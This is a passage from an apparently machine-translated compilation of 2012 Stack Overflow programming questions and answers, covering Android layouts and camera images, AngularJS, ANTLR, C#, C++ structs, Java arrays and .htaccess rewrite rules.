     public void onActivityCreated(Bundle savedInstanceState) {
         super.onActivityCreated(savedInstanceState);

         container = (RelativeLayout) getView().findViewById(R.id.container);
         container.setOnTouchListener(this);

         // Temp- Add a bunch of images to test scrolling
         for(int i=0; i<1500; i+=100) {
             for (int j=0; j<1500; j+=100) {
                 int color = colors[(i+j)%3];

                 ImageView image = new ImageView(getActivity());
                 image.setScaleType(ImageView.ScaleType.CENTER);
                 image.setBackgroundColor(color);

                 LayoutParams lp = new RelativeLayout.LayoutParams(100, 100);
                 lp.setMargins(i, j, 0, 0); 
                 image.setLayoutParams(lp);

                 container.addView(image);
             }
         }
     }

    @Override 
    public boolean onTouch(View v, MotionEvent event) {
        switch (event.getAction()) {
            case MotionEvent.ACTION_DOWN: {
                currentX = (int) event.getRawX();
                currentY = (int) event.getRawY();
                break;
            }

            case MotionEvent.ACTION_MOVE: {
                int x2 = (int) event.getRawX();
                int y2 = (int) event.getRawY();
                container.scrollBy(currentX - x2 , currentY - y2);
                currentX = x2;
                currentY = y2;
                break;
            }   
            case MotionEvent.ACTION_UP: {
                break;
            }
        }
        return true; 
    }
} 
```

XML:

```
<FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    tools:context=".FloorPlanFrag">

    <RelativeLayout 
        android:id="@+id/container" 
        android:layout_width="fill_parent" 
        android:layout_height="fill_parent" />
</FrameLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T22:10:55.557

在查看[RelativeLayout 源代码](http://grepcode.com/file_/repository.grepcode.com/java/ext/com.google.android/android/1.6_r2/android/widget/RelativeLayout.java/?v=source)时，我注意到`onMeasure()`调用`applyHorizontalSizeRules(LayoutParams childParams, int myWidth)`和`applyVerticalSizeRules(LayoutParams childParams, int myHeight)`.

在`applyHorizontalSizeRules`我发现对于 myWidth 和 myHeight 参数：

```
// -1 indicated a "soft requirement" in that direction. For example:        
// left=10, right=-1 means the view must start at 10, but can go as far as it wants to the right 
```

myWidth 参数初始化为 -1，然后根据 MeasureSpec 的模式更改 onMeasure() 的参数。

因此，我创建了自己的扩展 RelativeLayout 的视图，并覆盖 onMeasure() 以将模式设置为“未指定”：

```
@Override
protected void onMeasure(int widthMeasureSpec, int heightMeasureSpec) {
    int width = MeasureSpec.getSize(widthMeasureSpec);
    int height = MeasureSpec.getSize(heightMeasureSpec);

    int newWidthSpec = MeasureSpec.makeMeasureSpec(width, MeasureSpec.UNSPECIFIED);
    int newHeightSpec = MeasureSpec.makeMeasureSpec(height, MeasureSpec.UNSPECIFIED);

    super.onMeasure(newWidthSpec, newHeightSpec);
} 
```

奇迹般有效！

# android - 在捕获图像上显示时间和日期

> ID：13125898
> 
> 赞同：2
> 
> 时间：2012-10-29T16:39:06.870
> 
> 标签：android, date, time, android-camera

![在此处输入图像描述](../Images/ffb0dae1a3f42c6678a7f7a6473f85c6.png)

如何显示如下图所示的时间和日期。我有一个捕获图像的代码。但是我如何在捕获图像时显示时间和日期。这是启动相机应用程序的代码

我的代码：

```
public class MyCameraActivity extends Activity {
    private static final int CAMERA_REQUEST = 1888; 
    private ImageView imageView;

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);
        this.imageView = (ImageView)this.findViewById(R.id.imageView1);
        Button photoButton = (Button) this.findViewById(R.id.button1);
        photoButton.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                Intent cameraIntent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE); 
                startActivityForResult(cameraIntent, CAMERA_REQUEST); 
            }
        });
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {  
        if (requestCode == CAMERA_REQUEST && resultCode == RESULT_OK) {  
            Bitmap photo = (Bitmap) data.getExtras().get("data"); 
            imageView.setImageBitmap(photo);
        }  
    } 
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-10-29T16:54:20.947

检查这些链接[link1](https://stackoverflow.com/questions/8047914/how-to-paint-on-image-and-save-that-image-in-to-android)和[link2](https://stackoverflow.com/questions/9076050/how-to-paint-on-an-image-and-save-the-image-to-phone-gallery-in-android)

在这里，您拥有的图像被带到画布上。现在画布用于修改图像，方法是使用类似的东西在上面写一些东西

```
Paint paint = new Paint(); 
paint.setColor(Color.WHITE); 
paint.setStyle(Style.FILL); 
canvas.drawPaint(paint); 

paint.setColor(Color.BLACK); 
paint.setTextSize(20); 

SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMdd_HHmmss");
String currentDateandTime = sdf.format(new Date());
canvas.drawText(currentDateandTime , 10, 25, paint); 
```

这可以帮助您将文本绘制到图像上。试试看。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-09-14T05:42:55.637

```
imagename = String.valueOf(System.currentTimeMillis());
    Intent intent = new Intent(android.provider.MediaStore.ACTION_IMAGE_CAPTURE);
    String path = Environment.getExternalStorageDirectory() + "/Pictures/" + "pic_" + imagename + ".jpg";
    File file = new File(path);
    imageUri = Uri.fromFile(file);
    intent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, imageUri);
//on activity Result
Canvas canvas = new Canvas(drawableBitmap);
                canvas.drawBitmap(drawableBitmap, 0, 0, null);
                Paint paint = new Paint();
                paint.setColor(getResources().getColor(R.color.Orange));
                paint.setTextSize(22);
                DateFormat dateFormatter1 = new SimpleDateFormat("dd-MM-yyyy");
                DateFormat dateFormatter2 = new SimpleDateFormat("hh:mm:ss");
                dateFormatter1.setLenient(false);
                dateFormatter2.setLenient(false);
                java.util.Date today = new java.util.Date();
                // java.util.Timer;
                String d = dateFormatter1.format(today);
                String t = dateFormatter2.format(today);

                canvas.drawText("" + d + ", " + t, 20f ,    loadedBitmap.getHeight() - 24, paint);
                ByteArrayOutputStream bytes = new ByteArrayOutputStream();
                drawableBitmap.compress(Bitmap.CompressFormat.JPEG, 40, bytes);
                String path = Environment.getExternalStorageDirectory()+ "/Pictures/" + "pic_" + imagename + ".jpg";
                File file = new File(path);
                file.createNewFile();
                FileOutputStream fo = new FileOutputStream(file);
                fo.write(bytes.toByteArray());
                fo.close(); 
```

# angularjs - 如何在仅限于注释的 angularjs 指令中设置属性

> ID：13125899
> 
> 赞同：12
> 
> 时间：2012-10-29T16:39:09.763
> 
> 标签：angularjs

我在 angularjs 中找到了不错的功能。可以设置指令以处理评论。

```
{
    ...
    restrict: 'M'
    ...
} 
```

正如文档中所说，这可以解决问题。该指令的用法如下：

```
<!-- directive: my-directive-name --> 
```

只要我不需要将参数传递给该指令，它就可以正常工作。是否可以在仅限于评论的指令上设置参数？语法是什么？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-10-29T17:43:29.340

```
<!-- directive: my-directive-name this is all an argument --> 
```

指令名称之后的所有内容都是传递给指令的值。

```
app.directive('myDirectiveName', function(){
   return {
      restrict: 'M',
      link: function(scope, elem, attr) {
          alert(attr.myDirectiveName); //alerts "this is all an argument"
      }
   };
}); 
```

# algorithm - 特定的 Kd 树修改

> ID：13125901
> 
> 赞同：0
> 
> 时间：2012-10-29T16:39:14.840
> 
> 标签：algorithm, tree

现在可以使用 kd 尝试来存储 N 维数据。我的具体问题是，如果我们有固定的 3D 空间（即它的边界不改变）和传入事件，每个都具有第 4 维（时间）不断增加，可以修改什么。首先想到的是使用函数 f(t) = 1/2^t ，它会慢慢接近零……这有意义吗？:)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T17:43:23.800

你想对数据做什么样的查询？

最简单的是空间维度的 kd 树，以及当时一些简单的有序数据结构。如果空间位置完全相同的项目很少，那么一个简单的列表就足够了。

```
new KDTree<double, List<Item>>(3) 
```

其中`Item`类型包含空间和时间位置的字段。

如果空间重合点的数量可以变得更大，您可以将列表交换为二叉搜索树。

# php - 从 iOS 客户端启动 jaxl（php xmpp 客户端）服务器

> ID：13125903
> 
> 赞同：0
> 
> 时间：2012-10-29T16:39:20.230
> 
> 标签：php, macos, webserver, xmpp

我为 iPhone 创建了一个 xmpp 客户端。当有人给我发消息并且 iPhone 客户端关闭时，我想接收远程通知。因此，我需要使用 php 连接到幕后的 xmpp 客户端。我目前正在使用 NSURLConnection 进行连接，如下所示：

```
NSString * url = [http://my_mac_ip_address/some_folder/jaxlcode/examples/xmpp_client?device_token=%@&another_field=%@, deviceToken, anotherField];
NSURL * url = [NSURL URLWithString:urlStr];
NSURLRequest * request = [NSURLRequest requestWithURL:url];
NSURLConnection * urlConnection =[[NSURLConnection alloc] initWithRequest:request delegate:nil]; 
```

在 jaxl 代码上，我使用 php 更改了 argv[0]、argv[1]、argv[2] 参数来获取参数，这样我就可以使用 NSURLConnection。当我直接从终端连接启动服务器时，总是启动，并成功验证（通过 php 脚本 arg1 arg2 arg3）。我的问题是当我从 chrome 浏览器启动服务器或使用 NSURLConnection （我相信）与从浏览器启动时相同。代码超时的时间超过 50%。

有没有其他方法可以启动服务器，或者创建到 jaxl php xmpp 客户端服务器的更稳定的连接？

# c# - 如何以编程方式卸载 Windows 中的字体？

> ID：13125907
> 
> 赞同：1
> 
> 时间：2012-10-29T16:39:28.223
> 
> 标签：c#, fonts

我已经尝试过寻找这个问题的答案，但我在 SO 上找不到任何东西，这让我很惊讶，我想肯定这一定是在过去被问过的......

我需要使用 C# .Net（版本 4）应用程序从 windows 目录中删除/卸载字体。有问题的字体通常可以在以下位置找到：`C:/Windows/Fonts`

我最初的想法是我可以删除文件（使用`File.Delete(...)`），但我不确定这是否足够？我的担心来自字体的安装...如果您将文件复制到字体文件夹，那么您会看到一个对话框，说明字体正在安装。

如果删除文件就足够了，那么我很乐意这样做，还是他们应该这样做的更推荐的方式？

如果它有任何区别，那么操作系统是 Windows XP，字体是自定义字体，但我不确定原来的安装方法是什么

* * *

显然，在 StackOverflow 上发布带有 C# 标签的内容显然不够……**我想从 C# .Net (version 4) application 执行此操作**。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T16:42:56.467

根据这个[http://support.microsoft.com/kb/314960](http://support.microsoft.com/kb/314960)删除字体文件就足够了

# java - NSEE 是什么意思？这段代码发生了什么？

> ID：13125908
> 
> 赞同：1
> 
> 时间：2012-10-29T16:39:30.977
> 
> 标签：java

我正在阅读以下代码，并遇到了 NSEE。这是什么意思？以下代码块试图演示什么？

```
public static void objectArrayExamples()
{
Dog[] dogList = new Dog[10];
// How many Dog objects now exist?
dogList[5].bark(5); //uh oh! NSEE
for(int i = 0; i < dogList.length; i++)
{
dogList[i] = new Dog();
}
dogList[3].setName(“Bowzer”);
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T16:43:34.160

从上下文我猜`NoSuchElementException`，但这不是你在这种情况下会得到的，你实际上会得到一个`NullPointerException`，因为在 Java 中，一个新的非原始类型数组充满了空值。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:45:22.080

`NSEE`代表`NoSuchElementException`，但是这个例子是错误的，你会得到一个`NullPointerException`。

它试图证明的是一个很好的问题，我的猜测是它试图证明初始化数组本身和初始化该数组的元素之间的区别。

教训是它`new Dog[10]`实际上并没有创建任何`Dog`对象，所以评论中问题的答案是：没有。`new Dog[10]`只创建一个空数组，10 个元素长，能够容纳`Dog`对象。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:42:50.253

可能是[NoSuchElementException](http://docs.oracle.com/javase/1.4.2/docs/api/java/util/NoSuchElementException.html)。你会在你的代码中得到 NullPointerException 因为你从来没有填充过你的数组。

```
dogList[5].bark(5); //uh oh! NSEE 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-10-29T16:46:03.433

你得到 NPE -`NullPointerException`因为你创建了数组但没有填充它。您的数组仅包含空元素。当您尝试访问元素 #5 的方法时，您会得到 NPE，因为该元素为空。

您必须先初始化元素：

`dogList[5] = new Dog();`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-10-29T16:46:22.147

由于您只是将数组声明为`Dog[] dogList = new Dog[10];`，而不是填充数组，因此它应该`NullPointerException`在检索/使用 ( `dogList[5].bark(5);`) 时给出异常，说明没有这样的元素。

如果您`dogList[5].bark(5);`在填充阵列后向下移动，那么您应该很好，例如：

```
 Dog[] dogList = new Dog[10];
    for(int i = 0; i < dogList.length; i++)
    {
      dogList[i] = new Dog(); //<- Your array is populated here
    }
    dogList[5].bark(5); //<-- Your statement can be moved here
    dogList[3].setName(“Bowzer”); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-10-29T16:46:36.373

`NoSuchElementException`是`Enumeration`API 的一个例外，在您显示的代码中没有任何痕迹。也许该方法`bark`使用此 API，但从您发布的代码中无法分辨。

当然，如果您显示的是应该发生异常的文字代码，那么您的陈述就是错误的，因为那段代码不可能产生异常，因为没有`Dog`调用该方法`bark`的实例。此代码可靠地抛出一个`NullPointerException`.

# java - 屏幕阅读器并将复选框添加到按钮组，同时仍允许多项选择

> ID：13125909
> 
> 赞同：1
> 
> 时间：2012-10-29T16:39:32.297
> 
> 标签：java, swing, accessibility, screen-readers, buttongroup

为了使屏幕阅读器可以访问 GUI，复选框应属于按钮组。但是，如果要允许同时选中多个复选框，则不能将它们添加到 javax.swing.ButtonGroup，因为“打开”其中一个按钮会关闭组中的所有其他按钮。

是否有其他类型的“按钮组”您应该添加复选框以使屏幕阅读器可以访问 GUI？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T19:35:03.060

制作一种新的`ButtonGroup`允许排除：

```
public class ExclusiveButtonGroup extends ButtonGroup {
    private ArrayList<ButtonModel> exclusives;

    public ExclusiveButtonGroup(AbstractButton... exclusives){
        for(AbstractButton b : exclusives)
            this.exclusives.add(b.getModel);
    }

@Override
    public void setSelected(ButtonModel model, boolean select) {
        if(!exclusives.contains(model))
            super.setSelected(model, select);
    } 
```

# javascript - 在 node.js 中安装 http-proxy 模块需要帮助

> ID：13125915
> 
> 赞同：0
> 
> 时间：2012-10-29T16:39:40.597
> 
> 标签：javascript, node.js

我正在尝试在 Node 上安装 http-proxy，因此可以设置 HTTPS 代理，但运行时出现以下错误。关于如何获取 http-proxy 的任何建议或如何使用 node.js 设置 HTTPS 代理的任何其他建议。提前致谢

npm 安装 http-proxy

```
npm http GET https://registry.npmjs.org/http-proxy
npm http 304 https://registry.npmjs.org/http-proxy
npm ERR! Error: ENOTDIR, mkdir '/Users/rshroff/tmp/npm-15272/1351528387771-0.3611239262390882'
npm ERR! If you need help, you may report this log at:
npm ERR!     <http://github.com/isaacs/npm/issues>
npm ERR! or email it to:
npm ERR!     <npm-@googlegroups.com>

npm ERR! System Darwin 11.3.0
npm ERR! command "node" "/usr/local/bin/npm" "install" "http-proxy"
npm ERR! cwd /Users/rshroff
npm ERR! node -v v0.8.10
npm ERR! npm -v 1.1.65
npm ERR! path /Users/rshroff/tmp/npm-15272/1351528387771-0.3611239262390882
npm ERR! code ENOTDIR
npm ERR! errno 27
npm ERR! 
npm ERR! Additional logging details can be found in:
npm ERR!     /Users/rshroff/npm-debug.log
npm ERR! not ok code 0 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:54:53.140

是的，所以这里的问题是我的 tmp 目录没有写权限。抱歉问了这么愚蠢的问题。

# c# - 方法签名 - TestMethod 之间的区别 () 和 TestMethod(type t)

> ID：13125923
> 
> 赞同：0
> 
> 时间：2012-10-29T16:40:03.130
> 
> 标签：c#

以下两个方法签名有什么区别：

```
public static void test<T>() 
```

对比

```
public static void test(Type t) 
```

我知道第二个允许将类型传递给方法，但我不清楚第一个的具体做法有何不同。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T16:42:51.347

对于前者，您的类型*必须*在编译时已知，并且您将能够在方法中使用“T”作为类型名称的替代，例如变量声明或强制转换，就好像您正在编写普通代码一样.

对于后者，类型可能直到运行时才知道，但您将不得不使用反射或动态对象来完成某些使用泛型更容易（并且类型安全）的事情。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-29T16:42:25.710

第一个需要在编译时指定类型（T），并且是一个泛型方法。

第二个允许您在运行时指定类型，并且是非泛型方法。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-29T16:43:33.077

第一个是通用方法。这意味着很多事情：

*   该类型在*编译时*解析。您可以调用`test<int>`or `test<String>`，但不能`test<t>`使用`t`变量调用。

*   由于类型是在编译时解析的，因此您可以在方法的其他部分使用此类型，例如作为返回类型、作为参数的类型或作为方法内部变量的类型。例子：

    ```
    public static T test<T>(T param) { ... }

    int x = test(myString);   // Causes a compile-time error 
    ```

# c++ - 将 boost::assign 与嵌套在 std::map 中的 std::set 一起使用

> ID：13125924
> 
> 赞同：4
> 
> 时间：2012-10-29T16:40:03.760
> 
> 标签：c++, boost

我正在尝试使用`boost::assign`来模拟`std::map`包含 a 的C++11 初始化`std::set`。

```
#include <set>
#include <map>
#include <stdint.h>

#include <boost/assign/list_of.hpp>

typedef std::map< uint32_t, std::set< uint32_t> > the_map_t;

the_map_t data = boost::assign::map_list_of( 1, boost::assign::list_of(10)(20)(30) )
                                           ( 2, boost::assign::list_of(12)(22)(32) )
                                           ( 3, boost::assign::list_of(13)(23)(33) )
                                           ( 4, boost::assign::list_of(14)(24)(34) ); 
```

using的初始化在单独`std::set`使用`boost::assign::list_of`时按预期工作，但是当我尝试上面的代码时，分配在`std::set`调用 's 的构造函数时是模棱两可的：

```
map-assign.cpp:16:   instantiated from here
include/c++/4.4.6/bits/stl_pair.h:101: error: call of overloaded set(const   boost::assign_detail::generic_list<int>&) is ambiguous
include/c++/4.4.6/bits/stl_set.h:188: note: candidates are: 
    std::set<_Key, _Compare, _Alloc>::set(
        const std::set<_Key, _Compare, _Alloc>&) 
        [with _Key = unsigned int, _Compare = std::less<unsigned int>, _Alloc = std::allocator<unsigned int>]

include/c++/4.4.6/bits/stl_set.h:145: note:                 
    std::set<_Key, _Compare, _Alloc>::set(
        const _Compare&, const _Alloc&) 
        [with _Key = unsigned int, _Compare = std::less<unsigned int>, _Alloc = std::allocator<unsigned int>] 
```

如何解决此歧义错误？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-10-29T20:16:34.890

在这种情况下`boost::assign::map_list_of`，需要第二个模板参数的提示 - `<uint32_t, std::set< uint32_t> >`。因此线

```
the_map_t data = boost::assign::map_list_of(...); 
```

变成

```
the_map_t data = boost::assign::map_list_of<uint32_t, std::set< uint32_t> >(...); 
```

# antlr - 简单的 ANTLR 语法有什么问题？

> ID：13125935
> 
> 赞同：1
> 
> 时间：2012-10-29T16:40:39.737
> 
> 标签：antlr

我正在编写一个 ANTLR 语法来解析日志文件，但遇到了一个问题。我简化了语法以重现问题，如下所示：

```
stmt1:
  '[ ' elapse ': ' stmt2
  ;

stmt2:
  '[xxx'
  ;

stmt3:
  ': [yyy'
  ;

elapse :
  FLOAT;

FLOAT
    :   ('0'..'9')+ '.' ('0'..'9')* 
    ; 
```

当我使用以下字符串测试语法时：

```
[ 98.9: [xxx 
```

我得到了错误：

```
E:\work\antlr\output\__Test___input.txt line 1:9 mismatched character 'x' expecting 'y'
E:\work\antlr\output\__Test___input.txt line 1:10 no viable alternative at character 'x'
E:\work\antlr\output\__Test___input.txt line 1:11 no viable alternative at character 'x'
E:\work\antlr\output\__Test___input.txt line 1:12 mismatched input '<EOF>' expecting ': ' 
```

但是如果我删除 ruel 'stmt3'，同样的字符串会被接受。

我不确定发生了什么...

感谢您的任何建议！

莱昂

* * *

感谢巴特的帮助。我试图纠正语法。我认为，基线，我必须消除所有标记的歧义。我添加了 WS 令牌以简化规则。

```
stmt1:
  '[' elapse ':' stmt2
  ;

stmt2:
  '[' 'xxx'
  ;

stmt3:
  ':' '[' 'yyy'
  ;

elapse :
  FLOAT;

FLOAT
    :   ('0'..'9')+ '.' ('0'..'9')* 
    ;

WS : (' ' |'\t' |'\n' |'\r' )+ {skip();} ; 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-10-29T18:45:14.917

ANTLR 严格区分词法分析器规则（令牌）和解析器规则。尽管您在解析器规则中定义了一些文字，但它们仍然是标记。这意味着以下语法（在实践中）与您的示例语法等效：

```
stmt1  : T1 elapse T2 stmt2 ;
stmt2  : T3 ;
stmt3  : T4 ;
elapse : FLOAT;

T1     : '[ ' ;
T2     : ': ' ;
T3     : '[xxx' ;
T4     : ': [yyy' ;
FLOAT  : ('0'..'9')+ '.' ('0'..'9')* ; 
```

现在，当词法分析器尝试从输入构造标记时`"[ 98.9: [xxx"`，它成功地创建标记`T1`和`FLOAT`，但是当它*看到* `": ["`时，它尝试构造`T4`标记。但是当流中的下一个字符是 a`"x"`而不是 a`"y"`时，词法分析器会尝试构造另一个以 开头的标记`": ["`。但是由于没有这样的标记，词法分析器会发出错误：

> [...] 不匹配的字符 'x' 期望 'y'

不，词法分析器不会回溯以“放弃”字符`"["`from`": ["`以匹配 token `T2`，也不会在 char-stream 中向前看以查看是否`T4`真的可以构造 token。ANTLR 的 LL(*) 仅适用于解析器规则，不适用于词法分析器规则！

# javascript - 当有人单击按钮时，如何打开 javascript 文件？

> ID：13125938
> 
> 赞同：0
> 
> 时间：2012-10-29T16:40:44.693
> 
> 标签：javascript

我有一个网站，我有这个 javascript 代码我将放在下面的标题中

```
<!-- GATEWAY -->
<script type="text/javascript" src="http://www.al.com/al.js"></script>
<script type="text/javascript"> 
    al.check('f6687144358efd6746bc25f7c145f760'); 
</script> 
```

现在，当有人单击我网站上的按钮时，我想打开该 javascript。（IMG HTML 按钮）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:44:21.400

把它放在onclick中怎么样？

```
<button onclick="javascript:al.check('f6687144358efd6746bc25f7c145f760');">
Click
</button> 
```

# c - 光强与 R,G,B 的关系

> ID：13125939
> 
> 赞同：0
> 
> 时间：2012-10-29T16:40:49.887
> 
> 标签：c, graphics

我有一个强度（ 10000,10000, 5000 ）的环境光。我正在尝试为图元着色。

如您所知，R、G 和 B 的颜色值介于 0 到 255 之间。如何根据光强度找到像素的颜色？

平台：linux和编程语言c

编辑 ：

在光线追踪器中，我们正在计算

```
for each ambient light in the environment
 color . R  += Intensity of the light * ambient coefficient for color R
 color . G  += Intensity of the light * ambient coefficient for color G
 color . B  += Intensity of the light * ambient coefficient for color B 
```

但是，每当我尝试使用 openGL 在屏幕上发出此像素颜色值时。

`set pixel color ( color )`

由于强度高且最大颜色值低，我采用了错误的颜色。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-29T17:04:32.840

正如所写的那样，这个问题还不清楚，所以这里有一些一般性的建议。

渲染器中的颜色通常保存为每个 RGB 分量的标称范围为 [0..1] 的值。

当这些颜色被渲染为像素时，它们通常只需乘以 255 即可得到 24 位颜色值（每个组件 8 位）。

如果原始值*超出*[0..1] 范围，则**必须**对其进行“钳位”，以使生成的像素值落在 [0..255] 范围内。

该钳位可以“每个组件”完成，在您的情况下会导致 (255, 255, 255)，或者每个组件可以除以最大组件，得到 (255, 255, 127) - 即保留它们的相对伪代码中的强度：

```
float scale = max(r, g, b);
if (scale < 1) {
    scale = 1;     // don't normalise colours that are "in range"
}

byte R = 255 * (r < 0 ? 0 : r / scale);
byte G = 255 * (g < 0 ? 0 : g / scale);
byte B = 255 * (b < 0 ? 0 : b / scale); 
```

所有*中间*计算通常都会保留强度的完整动态范围。例如，太阳的亮度为“1”是没有意义的，因为相比之下，场景中的所有其他物体都会有一个几乎无限小的值。

因此，钳位的最终结果是，对场景贡献过多光的光源会产生图像“饱和”——即，如果在明亮的照片上将快门打开太久，您会得到相同的效果场景。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-29T17:04:16.820

这就是你想要的：亮度 = sqrt( .241*R*R + .691*G*G + .068*B*B )

在此处查找更多信息：[http ://www.nbdtech.com/Blog/archive/2008/04/27/Calculating-the-Perceived-Brightness-of-a-Color.aspx](http://www.nbdtech.com/Blog/archive/2008/04/27/Calculating-the-Perceived-Brightness-of-a-Color.aspx)

或在这里：[http](http://en.wikipedia.org/wiki/Luminance_(relative) ://en.wikipedia.org/wiki/Luminance_(relative )

# ios - 允许团队成员创建应用 ID

> ID：13125940
> 
> 赞同：0
> 
> 时间：2012-10-29T16:40:49.847
> 
> 标签：ios, provisioning-profile, app-id

我的公司决定外包 iOS 应用程序的开发。我们已将他们的开发人员添加为我们 iOS 程序开发人员的团队成员。

在我看来，App ID 的设置是一个关键点，我更愿意让他们来管理它。我对吗？

如果是，是否有解决方案让他们创建/更新 App ID，而不给他们团队管理员角色？关键是：我们想让他们管理 App ID、配置文件等……但我们不想让他们像团队管理员那样在 App Store 上分发任何应用程序。

谢谢你的分析，问候。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-29T16:56:43.307

提供三种角色：团队代理、团队管理员和团队成员。只有团队代理才能提交应用程序。将一个人指定为团队管理员对于处理您描述的任务很常见。

# c# - 将字符串 (System.String) 转换为类型

> ID：13125942
> 
> 赞同：7
> 
> 时间：2012-10-29T16:41:08.833
> 
> 标签：c#, xml, linq

我正在尝试创建一个通用的 XML 到对象转换器。换句话说，以下是我的 XML

```
<setting>
   <name>testing</name> 
   <type>System.String</type>
   <defaultObj>TTTT</defaultObj>
</setting> 
```

type 字段保存其加载回的对象的类型。这只是我在其中进行序列化的对象结构。无论如何，我在转换时遇到问题

```
System.String 
```

变成一个实际的类型变量。因此，例如，为了转换我有以下代码：

```
foreach (XNode node in document.Element(root).Nodes())
{
   T variable = new T(); //where T : new()

   foreach (FieldInfo field in fields)
   {
      field.SetValue(variable, Convert.ChangeType(((XElement)node).Element(field.Name).Value, field.FieldType));
   }

   retainedList.Add(variable);
} 
```

它以通用方式获取对象。该算法完美运行，直到遇到 Type 字段。我得到一个：

```
Invalid cast from 'System.String' to 'System.Type'. 
```

运行时错误。据我所知，直接将类型标识符（字符串）直接转换为类型存在问题。我不确定如何解决这个问题，至少在保持通用和清洁方面是这样。有任何想法吗？如果问题有点模糊，我很抱歉，如果您不太了解，我会尝试进一步澄清。任何帮助是极大的赞赏！

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-10-29T16:46:20.330

您需要将字符串`System.String`转换为类型`System.String`。

你可以这样做`Type.GetType(string typeName);`

例如，`type`下面的变量将`Type`具有`System.String`.

```
var type = Type.GetType("System.String"); 
```

然后，您可以在您正在使用`Type`的`Convert.ChangeType`重载中使用它。

```
Convert.ChangeType(fieldValue, type); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-10-29T16:46:32.543

看一下[Type.GetType](http://msdn.microsoft.com/en-us/library/system.type.gettype.aspx)，它有多种重载，可以将指定为字符串的类型映射到`Type`实例。

* * *

## 回答 #3

> 赞同：-7
> 
> 时间：2012-10-29T16:55:01.577

在我看来，这里需要说的是，在开始处理序列化器和反序列化器之前，您应该对 C# 编程更加熟悉。正如上面所建议的，这个特殊的障碍可以使用 Type.GetType 方法来解决，但是我会指出[System.Xml.Serialization](http://msdn.microsoft.com/en-us/library/system.xml.serialization.aspx)命名空间的方向，这样的事情已经解决并准备好使用。

# c++ - C++ 结构的函数

> ID：13125944
> 
> 赞同：114
> 
> 时间：2012-10-29T16:41:14.637
> 
> 标签：c++, function, struct

通常我们可以为 C++ 结构定义一个变量，如

```
struct foo {
  int bar;
}; 
```

我们还可以为结构定义函数吗？我们将如何使用这些功能？

* * *

## 回答 #1

> 赞同：178
> 
> 时间：2012-10-29T16:42:15.570

是的，除了默认访问级别（成员方式和继承方式）之外，a`struct`与 a 相同。（与模板一起使用时`class`会产生额外的含义）`class`

因此，类支持的每个功能都由结构支持。您将使用与将它们用于类相同的方法。

```
struct foo {
  int bar;
  foo() : bar(3) {}   //look, a constructor
  int getBar() 
  { 
    return bar; 
  }
};

foo f;
int y = f.getBar(); // y is 3 
```

* * *

## 回答 #2

> 赞同：46
> 
> 时间：2012-10-29T16:46:59.167

结构可以像类一样具有功能。唯一的区别是它们默认是公开的：

```
struct A {
    void f() {}
}; 
```

此外，结构也可以有构造函数和析构函数。

```
struct A {
    A() : x(5) {}
    ~A() {}

    private: int x;
}; 
```

# .htaccess - HTACCES mod 重写，堆叠规则

> ID：13125947
> 
> 赞同：1
> 
> 时间：2012-10-29T16:41:23.570
> 
> 标签：.htaccess, mod-rewrite

我们有一个如下所示的重写规则：

```
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule (?!^(cms|images|js|mobile)(/.*|)$)^.*$ page.php [NC,L] 
```

哪个按预期工作；如果该文件不存在，请转发到 page.php，这是一个通用页面，允许使用自定义 URL 的页面。

我们还想强制 www。在域之前：example.com -> www.example.com

为此，我们使用：

```
RewriteCond %{HTTP_HOST} ^example.com$
RewriteRule ^(.*)$ http://www.example.com/$1 [R=301,L] 
```

这也有效，但是当两者应该一起工作时：

```
example.com/non-existent-file 
```

我们最终得到：

```
www.example.bom/page.php 
```

默认为我们的 404 页面。如何修改这些规则以协同工作？我尝试过使用一些不同的 suffic 字符（即删除 [NC,L] 中的 L 以尝试处理这两个规则）。

我还尝试在 www 重定向（并删除 L 后缀）下重复转发到 page.php 行，但没有成功。

整个 HTACCESS 文件如下所示：

```
Options +FollowSymLinks
RewriteEngine On
RewriteBase   /

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-l
RewriteRule (?!^(cms|images|js|mobile)(/.*|)$)^.*$ page.php [NC,L]

RewriteCond %{HTTP_HOST} ^example.com$
RewriteRule ^(.*)$ http://www.example.com/$1 [R=302,L] 
```

